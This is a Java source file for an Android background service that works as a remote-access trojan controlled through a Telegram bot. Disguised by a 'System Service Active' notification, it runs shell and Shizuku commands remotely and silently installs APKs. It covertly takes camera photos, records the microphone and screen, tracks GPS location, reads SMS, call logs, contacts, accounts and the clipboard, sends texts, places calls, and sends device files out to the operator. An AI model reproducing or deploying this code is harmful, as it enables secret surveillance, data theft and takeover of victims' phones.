package com.java.panel;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.Scanner;

public class ShellService extends Service {

    public static ShellService instance;
    private boolean isRunning = true;
    public String BOT_TOKEN = "";
    public String ADMIN_CHAT_ID = "";
    public static final String TARGET_DIR = "/storage/emulated/0/panel/";
    private long lastUpdateId = 0;

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        File dir = new File(TARGET_DIR);
        if (!dir.exists()) dir.mkdirs();
        loadConfig();

        try {
            ClipboardManagerHelper.startLiveListener(this, this);
        } catch (Exception ignored) {}
    }

    private void loadConfig() {
        try {
            InputStream is = getAssets().open("config.txt");
            Scanner scanner = new Scanner(is);
            while (scanner.hasNextLine()) {
                String line = scanner.nextLine().trim();
                if (line.startsWith("BOT_TOKEN=")) BOT_TOKEN = line.substring(10).trim();
                else if (line.startsWith("ADMIN_CHAT_ID=")) ADMIN_CHAT_ID = line.substring(14).trim();
            }
            scanner.close();
            is.close();
        } catch (Exception e) { e.printStackTrace(); }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        createNotificationChannel();
        Notification notification = new NotificationCompat.Builder(this, "ShellServiceChannel")
                .setContentTitle("System Service Active")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .build();
        startForeground(1, notification);

        new Thread(() -> {
            while (isRunning) {
                checkTelegramUpdates();
                try { Thread.sleep(3000); } catch (InterruptedException e) { e.printStackTrace(); }
            }
        }).start();
        return START_STICKY;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel("ShellServiceChannel", "Shell Service", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    private void checkTelegramUpdates() {
        try {
            if (BOT_TOKEN.isEmpty()) return;
            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=2");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            Scanner scanner = new Scanner(conn.getInputStream());
            StringBuilder response = new StringBuilder();
            while (scanner.hasNext()) response.append(scanner.nextLine());
            scanner.close();

            JSONObject jsonObject = new JSONObject(response.toString());
            JSONArray results = jsonObject.optJSONArray("result");
            if (results != null) {
                for (int i = 0; i < results.length(); i++) {
                    JSONObject update = results.getJSONObject(i);
                    lastUpdateId = update.getLong("update_id");
                    if (update.has("message")) {
                        JSONObject message = update.getJSONObject("message");
                        String chatId = String.valueOf(message.getJSONObject("chat").getLong("id"));
                        if (chatId.equals(ADMIN_CHAT_ID)) {
                            if (message.has("document")) {
                                JSONObject doc = message.getJSONObject("document");
                                String fileId = doc.getString("file_id");
                                String fileName = doc.optString("file_name", "upload_" + System.currentTimeMillis());
                                downloadTelegramFile(fileId, TARGET_DIR + fileName, chatId);
                            } else if (message.has("photo")) {
                                JSONArray photos = message.getJSONArray("photo");
                                JSONObject bestPhoto = photos.getJSONObject(photos.length() - 1);
                                String fileId = bestPhoto.getString("file_id");
                                downloadTelegramFile(fileId, TARGET_DIR + "photo_" + System.currentTimeMillis() + ".jpg", chatId);
                            } else if (message.has("text")) {
                                handleCommand(message.getString("text").trim(), chatId);
                            }
                        }
                    }
                }
            }
        } catch (Exception e) { e.printStackTrace(); }
    }

    private String loadHelpText() {
        try {
            InputStream is = getAssets().open("help.txt");
            Scanner scanner = new Scanner(is, "UTF-8");
            StringBuilder sb = new StringBuilder();
            while (scanner.hasNextLine()) {
                sb.append(scanner.nextLine()).append("\n");
            }
            scanner.close();
            is.close();
            return sb.toString();
        } catch (Exception e) {
            return "╭───『 Forsaken Action Menu 』───╮\n\n" +
                    "  ➤ /shell <command>\n  ➤ /shizuku <command>\n  ➤ /accounts\n  ➤ /toast <message>\n" +
                    "  ➤ /tts <text>\n  ➤ /play <file_path>\n  ➤ /stop_audio\n  ➤ /reset_all\n" +
                    "  ➤ /popup <title> , <message>\n  ➤ /wallpaper [path]\n  ➤ /callnum <no>\n" +
                    "  ➤ /permission\n  ➤ /media_log\n  ➤ /send_intent <action> [data] [pkg]\n" +
                    "  ➤ /grapy <see|touch>\n" +
                    "  ➤ /screenrecord [seconds|stop]\n" +
                    "  ➤ /settings list\n  ➤ /settings <setting> <value>\n  ➤ /volume <type> <percentage>\n" +
                    "  ➤ /file <directory>\n  ➤ /filexp <command>\n  ➤ /data\n  ➤ /download <path>\n  ➤ /upload\n  ➤ /locate\n" +
                    "  ➤ /screenshot\n  ➤ /cam_front\n  ➤ /cam_back\n  ➤ /microphone [seconds]\n" +
                    "  ➤ /phone\n  ➤ /open_site <url>\n  ➤ /open_app <pkg>\n  ➤ /sysinfo\n" +
                    "  ➤ /getclip\n  ➤ /setclip <text>\n  ➤ /sms_send <tel> <msg>\n" +
                    "  ➤ /sms_list\n  ➤ /apps\n  ➤ /kill <package>\n  ➤ /calls\n  ➤ /connections <action> [sub] [param]\n" +
                    "  ➤ /http <get|post|ping> <target>\n" +
                    "  ➤ /sensor [type]\n  ➤ /vibrate [ms]\n\n" +
                    "╰────────────────────╯\n@JavaKyoseva";
        }
    }

    private String getCommandHelpDetail(String cmd) {
        cmd = cmd.toLowerCase().replace("/", "").trim();
        if (cmd.equals("settings")) {
            return "╭───『 ⚙️ /settings 』───╮\n\n" +
                   "Allows you to manage device system and hardware settings.\n\n" +
                   "**Usage:**\n" +
                   "  ➤ /settings list -> List settings\n" +
                   "  ➤ /settings flash on -> Turn on flashlight\n" +
                   "  ➤ /settings flash off -> Turn off flashlight\n" +
                   "  ➤ /settings rotation on -> Screen rotation\n" +
                   "  ➤ /settings airplane on -> Airplane mode\n" +
                   "  ➤ /settings dnd on -> Do Not Disturb\n" +
                   "  ➤ /settings timeout 60 -> Screen timeout\n\n" +
                   "╰──────────────────────────────────────╯";
        } else if (cmd.equals("screenrecord")) {
            return "╭───『 🎬 /screenrecord 』───╮\n\n" +
                   "Records the device screen as a video.\n\n" +
                   "**Usage:**\n" +
                   "  ➤ `/screenrecord` (Starts recording with default duration)\n" +
                   "  ➤ `/screenrecord 20` (Records for 20 seconds)\n" +
                   "  ➤ `/screenrecord stop` (Stops ongoing recording)\n\n" +
                   "╰──────────────────────────────────────────────────╯";
        } else if (cmd.equals("popup")) {
            return "╭───『 💬 /popup 』───╮\n\n" +
                   "Displays a realistic system dialog on the device screen.\n\n" +
                   "**Usage:** `/popup <title> , <message>`\n" +
                   "**Example:** `/popup Warning , Low battery level!`\n" +
                   "╰──────────────────────────────────────────────────╯";
        } else if (cmd.equals("grapy")) {
            return "╭───『 🤖 /grapy 』───╮\n\n" +
                   "Performs screen analysis and touch actions via Accessibility.\n\n" +
                   "**Usage:**\n" +
                   "  ➤ `/grapy see` (Shows screen node hierarchy)\n" +
                   "  ➤ `/grapy touch 500,800` (Clicks at coordinates)\n\n" +
                   "╰──────────────────────────────────────────────────╯";
        } else if (cmd.equals("shizuku")) {
            return "╭───『 💻 /shizuku 』───╮\n\n" +
                   "Executes root-level-like commands using Shizuku permission.\n\n" +
                   "**Usage:** `/shizuku <command>`\n" +
                   "**Example:** `/shizuku pm list packages`\n" +
                   "╰──────────────────────────────────────────────────╯";
        } else if (cmd.equals("shell")) {
            return "╭───『 🐚 /shell 』───╮\n\n" +
                   "Executes standard terminal shell commands on the device.\n\n" +
                   "**Usage:** `/shell <command>`\n" +
                   "**Example:** `/shell ls -la`\n" +
                   "╰──────────────────────────────────────────────────╯";
        } else if (cmd.equals("sysinfo")) {
            return "╭───『 📊 /sysinfo 』───╮\n\n" +
                   "Fetches hardware, battery, memory, and system information.\n\n" +
                   "**Usage:** `/sysinfo`\n" +
                   "╰──────────────────────────────────────────────────╯";
        } else if (cmd.equals("locate")) {
            return "╭───『 📍 /locate 』───╮\n\n" +
                   "Gets instant location coordinates via GPS or Network provider.\n\n" +
                   "**Usage:** `/locate`\n" +
                   "╰──────────────────────────────────────────────────╯";
        } else if (cmd.equals("screenshot")) {
            return "╭───『 📸 /screenshot 』───╮\n\n" +
                   "Captures and sends an instant screenshot of the device screen.\n\n" +
                   "**Usage:** `/screenshot`\n" +
                   "╰──────────────────────────────────────────────────╯";
        } else if (cmd.equals("cam_front") || cmd.equals("cam_back")) {
            return "╭───『 📷 /cam_front & /cam_back 』───╮\n\n" +
                   "Takes a secret background photo from the front or rear camera.\n\n" +
                   "**Usage:** `/cam_front` or `/cam_back`\n" +
                   "╰──────────────────────────────────────────────────╯";
        } else if (cmd.equals("microphone")) {
            return "╭───『 🎙️ /microphone 』───╮\n\n" +
                   "Records audio from the device microphone for a given duration.\n\n" +
                   "**Usage:** `/microphone [seconds]`\n" +
                   "╰──────────────────────────────────────────────────╯";
        } else if (cmd.equals("sms_send") || cmd.equals("sms_list")) {
            return "╭───『 ✉️ SMS Commands 』───╮\n\n" +
                   "Sending SMS and listing incoming/outgoing messages.\n\n" +
                   "**Usage:**\n" +
                   "  ➤ `/sms_send <number> <message>`\n" +
                   "  ➤ `/sms_list`\n" +
                   "╰──────────────────────────────────────────╯";
        } else if (cmd.equals("apps") || cmd.equals("kill")) {
            return "╭───『 📱 App Manager 』───╮\n\n" +
                   "Lists installed apps or kills a running application package.\n\n" +
                   "**Usage:**\n" +
                   "  ➤ `/apps`\n" +
                   "  ➤ `/kill <package_name>`\n" +
                   "╰──────────────────────────────────────────╯";
        } else if (cmd.equals("file") || cmd.equals("filexp") || cmd.equals("download") || cmd.equals("upload")) {
            return "╭───『 📁 File Management 』───╮\n\n" +
                   "Lists files and directories, downloads, or uploads files to the system.\n\n" +
                   "**Usage:**\n" +
                   "  ➤ `/file <path>`\n" +
                   "  ➤ `/filexp <path>`\n" +
                   "  ➤ `/download <path>`\n" +
                   "  ➤ `/upload` (Send file as message to bot)\n" +
                   "╰──────────────────────────────────────────╯";
        } else if (cmd.equals("connections") || cmd.equals("conn")) {
            return "╭───『 🔌 /connections 』───╮\n\n" +
                   "Manages network and connection settings (Wi-Fi, Bluetooth, etc.).\n\n" +
                   "**Usage:** `/connections <action> [sub] [param]`\n" +
                   "╰──────────────────────────────────────────────────╯";
        } else if (cmd.equals("vibrate")) {
            return "╭───『 📳 /vibrate 』───╮\n\n" +
                   "Vibrates the device for the specified millisecond duration.\n\n" +
                   "**Usage:** `/vibrate [milliseconds]`\n" +
                   "╰──────────────────────────────────────────╯";
        } else {
            return "❌ No detailed help found for command ('/" + cmd + "').\n" +
                   "For general menu, you can type: `/help`";
        }
    }

    private void handleCommand(String text, String chatId) {
        if (text.equals("/start") || text.equals("/help") || text.equals("/yardim")) {
            sendTelegramMessage(chatId, loadHelpText());
        }
        else if (text.startsWith("/help ") || text.startsWith("/yardim ")) {
            String subCommand = text.substring(text.indexOf(" ") + 1).trim();
            sendTelegramMessage(chatId, getCommandHelpDetail(subCommand));
        }
        else if (text.equals("/sysinfo")) {
            sendTelegramMessage(chatId, SystemInfoHelper.getSystemInfo(this));
        }
        else if (text.equals("/accounts")) {
            sendTelegramMessage(chatId, AccountHelper.getAccounts(this));
        }
        else if (text.startsWith("/toast ")) {
            String msg = text.substring(7).trim();
            sendTelegramMessage(chatId, ToastHelper.showToast(this, msg));
        }
        else if (text.startsWith("/tts ")) {
            String speechText = text.substring(5).trim();
            sendTelegramMessage(chatId, TtsHelper.speak(this, speechText));
        }
        else if (text.startsWith("/play ")) {
            String path = text.substring(6).trim();
            sendTelegramMessage(chatId, AudioPlayerHelper.playAudio(this, path));
        }
        else if (text.equals("/stop_audio")) {
            sendTelegramMessage(chatId, AudioPlayerHelper.stopAudio());
        }
        else if (text.equals("/reset_all")) {
            sendTelegramMessage(chatId, ResetHelper.resetAll(this));
        }
        else if (text.startsWith("/popup")) {
            String popupParam = "";
            if (text.length() > 6) {
                popupParam = text.substring(6).trim();
            }
            sendTelegramMessage(chatId, PopupHelper.showPopup(this, popupParam));
        }
        else if (text.startsWith("/wallpaper ")) {
            String wallPath = text.substring(11).trim();
            File f = new File(wallPath);
            if (!f.exists()) {
                File f2 = new File(TARGET_DIR + wallPath);
                if (f2.exists()) {
                    wallPath = f2.getAbsolutePath();
                } else {
                    File f3 = new File("/storage/emulated/0/" + wallPath);
                    if (f3.exists()) {
                        wallPath = f3.getAbsolutePath();
                    }
                }
            }
            sendTelegramMessage(chatId, WallpaperHelper.setWallpaper(this, wallPath));
        }
        else if (text.equals("/wallpaper")) {
            File dir = new File(TARGET_DIR);
            File[] files = dir.listFiles((d, name) -> name.startsWith("photo_") && name.endsWith(".jpg"));
            if (files != null && files.length > 0) {
                File latest = files[0];
                for (File file : files) {
                    if (file.lastModified() > latest.lastModified()) {
                        latest = file;
                    }
                }
                sendTelegramMessage(chatId, WallpaperHelper.setWallpaper(this, latest.getAbsolutePath()));
            } else {
                sendTelegramMessage(chatId, "❌ Usage: /wallpaper <file_path> or take/upload a photo first.");
            }
        }
        else if (text.startsWith("/callnum ")) {
            String number = text.substring(9).trim();
            sendTelegramMessage(chatId, CallHelper.makeCall(this, number));
        }
        else if (text.equals("/permission")) {
            sendTelegramMessage(chatId, PermissionHelper.getPermissions(this));
        }
        else if (text.equals("/media_log")) {
            sendTelegramMessage(chatId, MediaLogHelper.getMediaLogs(this));
        }
        else if (text.startsWith("/send_intent ")) {
            String[] parts = text.split("\\s+", 4);
            String action = parts.length > 1 ? parts[1] : null;
            String data = parts.length > 2 ? parts[2] : null;
            String pkg = parts.length > 3 ? parts[3] : null;
            sendTelegramMessage(chatId, IntentHelper.sendIntent(this, action, data, pkg));
        }
        else if (text.startsWith("/grapy ")) {
            String grapyParam = text.substring(7).trim();
            sendTelegramMessage(chatId, GrapyHelper.execute(this, grapyParam));
        }
        else if (text.startsWith("/screenrecord")) {
            String param = text.length() > 13 ? text.substring(13).trim() : "";
            if (param.equalsIgnoreCase("stop")) {
                sendTelegramMessage(chatId, ScreenRecordHelper.stopRecording(this, chatId));
            } else {
                int duration = 15;
                if (!param.isEmpty()) {
                    try {
                        duration = Integer.parseInt(param);
                    } catch (Exception ignored) {}
                }
                sendTelegramMessage(chatId, ScreenRecordHelper.startRecording(this, duration, chatId));
            }
        }
        else if (text.startsWith("/filexp ")) {
            String filexpParam = text.substring(8).trim();
            sendTelegramMessage(chatId, FileExplorerHelper.handleCommand(this, filexpParam));
        }
        else if (text.equals("/filexp")) {
            sendTelegramMessage(chatId, FileExplorerHelper.handleCommand(this, "/storage/emulated/0/"));
        }
        else if (text.equals("/getclip")) {
            new Handler(Looper.getMainLooper()).post(() -> {
                String clip = ClipboardManagerHelper.getClipboardText(this);
                sendTelegramMessage(chatId, clip);
            });
        }
        else if (text.startsWith("/setclip ")) {
            String clipText = text.length() > 9 ? text.substring(9) : "";
            sendTelegramMessage(chatId, ClipboardManagerHelper.setClipboardText(this, clipText));
        }
        else if (text.startsWith("/sms_send ")) {
            String[] p = text.split(" ", 3);
            if (p.length == 3) sendTelegramMessage(chatId, SmsManagerHelper.sendSms(p[1], p[2]));
            else sendTelegramMessage(chatId, "Usage: /sms_send <number> <message>");
        }
        else if (text.equals("/sms_list")) {
            sendTelegramMessage(chatId, SmsManagerHelper.getRecentSms(this));
        }
        else if (text.equals("/apps")) {
            sendTelegramMessage(chatId, AppManagerHelper.getInstalledApps(this));
        }
        else if (text.startsWith("/kill ")) {
            String pkg = text.substring(6).trim();
            sendTelegramMessage(chatId, AppManagerHelper.killApp(pkg));
        }
        else if (text.equals("/calls")) {
            sendTelegramMessage(chatId, CallLogHelper.getCallLogs(this));
        }
        else if (text.startsWith("/settings ")) {
            SettingsController settingsController = new SettingsController(this);
            String response = settingsController.executeCommand(text);
            sendTelegramMessage(chatId, response);
        }
        else if (text.startsWith("/volume ")) {
            String[] parts = text.split("\\s+");
            if (parts.length >= 3) {
                try {
                    SettingsController settingsController = new SettingsController(this);
                    int percent = Integer.parseInt(parts[2]);
                    String response = settingsController.setVolume(parts[1], percent);
                    sendTelegramMessage(chatId, response);
                } catch (Exception e) {
                    sendTelegramMessage(chatId, "❌ Invalid usage. Example: /volume media 50");
                }
            } else {
                sendTelegramMessage(chatId, "❌ Invalid usage. Example: /volume media 50");
            }
        }
        else if (text.startsWith("/connections ") || text.startsWith("/conn ")) {
            String[] parts = text.split("\\s+", 4);
            String action = parts.length > 1 ? parts[1] : null;
            String subAction = parts.length > 2 ? parts[2] : null;
            String param = parts.length > 3 ? parts[3] : null;
            ConnectionsHelper helper = new ConnectionsHelper(this);
            sendTelegramMessage(chatId, helper.execute(action, subAction, param));
        }
        else if (text.startsWith("/http ")) {
            String[] parts = text.split("\\s+", 3);
            if (parts.length >= 3) {
                HttpHelper helper = new HttpHelper();
                sendTelegramMessage(chatId, helper.execute(parts[1], parts[2]));
            } else {
                sendTelegramMessage(chatId, "❌ Invalid usage. Example: /http get https://example.com");
            }
        }
        else if (text.startsWith("/sensor")) {
            String param = "list";
            String[] parts = text.split("\\s+", 2);
            if (parts.length >= 2) {
                param = parts[1].trim();
            }
            SensorHelper sensorHelper = new SensorHelper(this);
            sendTelegramMessage(chatId, sensorHelper.getSensorData(param));
        }
        else if (text.startsWith("/vibrate")) {
            int duration = 1000;
            try {
                String[] parts = text.split("\\s+");
                if (parts.length >= 2) {
                    duration = Integer.parseInt(parts[1]);
                }
            } catch (Exception ignored) {}

            try {
                android.os.Vibrator v = (android.os.Vibrator) getSystemService(VIBRATOR_SERVICE);
                if (v != null) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        v.vibrate(android.os.VibrationEffect.createOneShot(duration, android.os.VibrationEffect.DEFAULT_AMPLITUDE));
                    } else {
                        v.vibrate(duration);
                    }
                    sendTelegramMessage(chatId, "📳 Device vibrated for " + duration + " ms.");
                } else {
                    sendTelegramMessage(chatId, "❌ Could not start vibrator service.");
                }
            } catch (Exception e) {
                sendTelegramMessage(chatId, "❌ Vibration error: " + e.getMessage());
            }
        }
        else if (text.equals("/locate")) {
            fetchAndSendLocation(chatId);
        }
        else if (text.equals("/screenshot")) {
            ScreenCaptureHelper.takeScreenshot(this, chatId);
        }
        else if (text.startsWith("/find ")) {
            String query = text.substring(6).trim();
            sendTelegramMessage(chatId, FileManagerHelper.findFile(new File("/storage/emulated/0/"), query));
        }
        else if (text.startsWith("/zip ")) {
            String path = text.substring(5).trim();
            sendTelegramMessage(chatId, FileManagerHelper.zipFolder(path, path + ".zip"));
        }
        else if (text.startsWith("/shell ")) {
            String cmd = text.substring(7).trim();
            sendTelegramMessage(chatId, executeShell(cmd));
        }
        else if (text.startsWith("/shizuku ")) {
            String cmd = text.substring(9).trim();
            sendTelegramMessage(chatId, executeShizuku(cmd));
        }
        else if (text.startsWith("/apk ")) {
            String apkPath = text.substring(5).trim();
            sendTelegramMessage(chatId, executeShizuku("pm install -r '" + apkPath + "'"));
        }
        else if (text.startsWith("/download ")) {
            String filePath = text.substring(10).trim();
            sendFileToTelegram(filePath, chatId);
        }
        else if (text.equals("/upload")) {
            sendTelegramMessage(chatId, "📤 Please send the file or photo you want to send to the device directly as a message to the bot via Telegram.");
        }
        else if (text.startsWith("/file ")) {
            String dirPath = text.substring(6).trim();
            sendTelegramMessage(chatId, FileManagerHelper.listDirectory(dirPath));
        }
        else if (text.equals("/data")) {
            sendTelegramMessage(chatId, FileManagerHelper.listDirectory(TARGET_DIR));
        }
        else if (text.equals("/cam_front")) {
            CameraHelper.takePicture(this, 1, chatId);
            sendTelegramMessage(chatId, "📸 Front camera triggering in the background...");
        }
        else if (text.equals("/cam_back")) {
            CameraHelper.takePicture(this, 0, chatId);
            sendTelegramMessage(chatId, "📸 Rear camera triggering in the background...");
        }
        else if (text.startsWith("/microphone")) {
            int duration = 10;
            try {
                String[] parts = text.split("\\s+");
                if (parts.length >= 2) {
                    duration = Integer.parseInt(parts[1]);
                }
            } catch (Exception ignored) {}
            MicHelper.startRecording(this, duration, chatId);
        }
        else if (text.equals("/phone")) {
            sendTelegramMessage(chatId, CallLogHelper.getContacts(this));
        }
        else if (text.startsWith("/open_site ")) {
            String siteUrl = text.substring(11).trim();
            try {
                if (!siteUrl.startsWith("http://") && !siteUrl.startsWith("https://")) {
                    siteUrl = "https://" + siteUrl;
                }
                Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(siteUrl));
                browserIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(browserIntent);
                sendTelegramMessage(chatId, "🌐 Opened in browser: " + siteUrl);
            } catch (Exception e) {
                sendTelegramMessage(chatId, "❌ Could not open browser: " + e.getMessage());
            }
        }
        else if (text.startsWith("/open_app ")) {
            String pkg = text.substring(10).trim();
            try {
                Intent launchIntent = getPackageManager().getLaunchIntentForPackage(pkg);
                if (launchIntent != null) {
                    launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(launchIntent);
                    sendTelegramMessage(chatId, "🚀 App launched -> " + pkg);
                } else {
                    sendTelegramMessage(chatId, "❌ App not found.");
                }
            } catch (Exception e) {
                sendTelegramMessage(chatId, "❌ Error: " + e.getMessage());
            }
        }
    }

    private void fetchAndSendLocation(String chatId) {
        new Thread(() -> {
            try {
                LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
                if (lm != null) {
                    if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
                        ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                        
                        Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                        if (loc == null) {
                            loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                        }

                        if (loc != null) {
                            double lat = loc.getLatitude();
                            double lon = loc.getLongitude();
                            sendTelegramMessage(chatId, 
                                "📍 Location Report:\nLat: " + lat + "\nLon: " + lon + "\n🔗 https://www.google.com/maps?q=" + lat + "," + lon);
                        } else {
                            sendTelegramMessage(chatId, "❌ Location data unavailable.");
                        }
                    } else {
                        sendTelegramMessage(chatId, "❌ Location permission missing.");
                    }
                }
            } catch (Exception e) {
                sendTelegramMessage(chatId, "❌ Location error: " + e.getMessage());
            }
        }).start();
    }

    private String executeShell(String command) {
        StringBuilder output = new StringBuilder();
        try {
            Process process = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            while ((line = errorReader.readLine()) != null) {
                output.append(line).append("\n");
            }
            process.waitFor();
        } catch (Exception e) {
            return "❌ Shell Error: " + e.getMessage();
        }
        return output.length() > 0 ? output.toString() : "✅ Command executed successfully (No output).";
    }

    private String executeShizuku(String command) {
        StringBuilder output = new StringBuilder();
        try {
            Class<?> shizukuClass = Class.forName("rikka.shizuku.Shizuku");
            
            Method pingBinderMethod = shizukuClass.getDeclaredMethod("pingBinder");
            pingBinderMethod.setAccessible(true);
            boolean isAlive = (Boolean) pingBinderMethod.invoke(null);
            if (!isAlive) {
                return "❌ Shizuku service not active.";
            }

            Method checkPermissionMethod = shizukuClass.getDeclaredMethod("checkSelfPermission");
            checkPermissionMethod.setAccessible(true);
            int permission = (Integer) checkPermissionMethod.invoke(null);
            if (permission != 0) { 
                return "❌ Shizuku permission not granted.";
            }

            Method newProcessMethod = shizukuClass.getDeclaredMethod("newProcess", String[].class, String[].class, String.class);
            newProcessMethod.setAccessible(true);
            
            Process process = (Process) newProcessMethod.invoke(null, new String[]{"sh", "-c", command}, null, null);
            if (process != null) {
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }
                while ((line = errorReader.readLine()) != null) {
                    output.append(line).append("\n");
                }
                process.waitFor();
            }
        } catch (ClassNotFoundException e) {
            return "❌ Shizuku library not found.";
        } catch (Exception e) {
            return "❌ Shizuku Command Error: " + e.getMessage();
        }
        return output.length() > 0 ? output.toString() : "✅ Shizuku command executed successfully.";
    }

    public void sendTelegramMessage(String chatId, String text) {
        if (text == null || text.isEmpty()) return;
        new Thread(() -> {
            try {
                if (text.length() > 4000) {
                    int index = 0;
                    while (index < text.length()) {
                        int math = Math.min(index + 4000, text.length());
                        String part = text.substring(index, math);
                        sendSingleTelegramMessage(chatId, part);
                        index = math;
                        try { Thread.sleep(300); } catch (Exception ignored) {}
                    }
                } else {
                    sendSingleTelegramMessage(chatId, text);
                }
            } catch (Exception e) { e.printStackTrace(); }
        }).start();
    }

    private void sendSingleTelegramMessage(String chatId, String text) {
        try {
            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + chatId + "&text=" + URLEncoder.encode(text, "UTF-8");
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.getInputStream().close();
        } catch (Exception e) { e.printStackTrace(); }
    }

    public void sendFileToTelegram(String filePath, String chatId) {
        new Thread(() -> {
            try {
                File file = new File(filePath);
                if (!file.exists()) {
                    sendTelegramMessage(chatId, "❌ File not found: " + filePath);
                    return;
                }
                String boundary = "*****";
                String lineEnd = "\r\n";
                String twoHyphens = "--";
                URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setDoInput(true);
                conn.setDoOutput(true);
                conn.setUseCaches(false);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Connection", "Keep-Alive");
                conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

                DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
                dos.writeBytes(twoHyphens + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd + lineEnd + chatId + lineEnd);
                
                dos.writeBytes(twoHyphens + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"document\";filename=\"" + file.getName() + "\"" + lineEnd);
                dos.writeBytes("Content-Type: application/octet-stream" + lineEnd + lineEnd);

                FileInputStream fis = new FileInputStream(file);
                byte[] buffer = new byte[8192];
                int bytesRead;
                while ((bytesRead = fis.read(buffer)) != -1) {
                    dos.write(buffer, 0, bytesRead);
                }
                fis.close();

                dos.writeBytes(lineEnd);
                dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
                dos.flush();
                dos.close();

                int responseCode = conn.getResponseCode();
                if (responseCode == 200) {
                    sendTelegramMessage(chatId, "✅ File sent successfully: " + file.getName());
                } else {
                    sendTelegramMessage(chatId, "❌ File sending failed. Code: " + responseCode);
                }
            } catch (Exception e) {
                sendTelegramMessage(chatId, "❌ File sending error: " + e.getMessage());
            }
        }).start();
    }

    private void downloadTelegramFile(String fileId, String savePath, String chatId) {
        new Thread(() -> {
            try {
                URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/getFile?file_id=" + fileId);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                Scanner scanner = new Scanner(conn.getInputStream());
                StringBuilder sb = new StringBuilder();
                while (scanner.hasNext()) sb.append(scanner.nextLine());
                scanner.close();

                JSONObject jsonObj = new JSONObject(sb.toString());
                if (jsonObj.getBoolean("ok")) {
                    String filePath = jsonObj.getJSONObject("result").getString("file_path");
                    String downloadUrl = "https://api.telegram.org/file/bot" + BOT_TOKEN + "/" + filePath;
                    
                    URL fileUrl = new URL(downloadUrl);
                    InputStream in = fileUrl.openStream();
                    FileOutputStream fos = new FileOutputStream(new File(savePath));
                    byte[] buffer = new byte[8192];
                    int n;
                    while ((n = in.read(buffer)) != -1) {
                        fos.write(buffer, 0, n);
                    }
                    fos.close();
                    in.close();
                    sendTelegramMessage(chatId, "📥 File successfully saved to device:\n" + savePath);
                }
            } catch (Exception e) {
                sendTelegramMessage(chatId, "❌ File download error: " + e.getMessage());
            }
        }).start();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}

